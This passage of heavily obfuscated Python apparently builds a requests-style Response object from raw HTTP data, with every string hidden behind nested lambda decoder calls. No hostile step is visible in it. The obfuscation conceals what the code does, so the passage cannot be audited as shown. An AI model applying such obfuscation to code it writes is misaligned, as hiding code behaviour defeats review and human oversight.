                content = b'\r\n\r\n'.join(response)
                response = 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()).models.Response()
                response.status_code = status_code
                response.headers = headers_response
                try:
                    content_type = headers_response[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xdc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc6'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xed'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))()]))))())())()]
                except KeyError:
                    try:
                        content_type = headers_response[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc6'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))()]))))())())()]
                    except KeyError:
                        content_type = None
                if not content_type:
                    content_type = None
                elif (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x01'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))()]))))())())() in content_type:
                    try:
                        content_type = content_type.split((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xd4'))()]))))())())())[(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01'))()].split((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xd6'))()]))))())())())[(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01'))()]
                    except IndexError:
                        content_type = content_type
                elif (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x11'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))()]))))())())() in content_type:
                    content_type = (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe2'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xec'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc6'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xd1'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xd1'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xce'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xd2'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc6'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xca'))()]))))())())()
                elif (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x03'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))()]))))())())() in content_type:
                    content_type = (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xff'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc6'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xd1'))()]))))())())()
                else:
                    content_type = content_type
                response.encoding = content_type
                response.raw = 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfb'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xcc'))()]))))())())()).response.HTTPResponse()
                response.reason = reason
                if isinstance(url, bytes):
                    response.url = url.decode((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xff'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc6'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xd1'))()]))))())())())
                else:
                    response.url = url
                response.request = 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()).models.PreparedRequest()
                response.request.prepare(method, url)
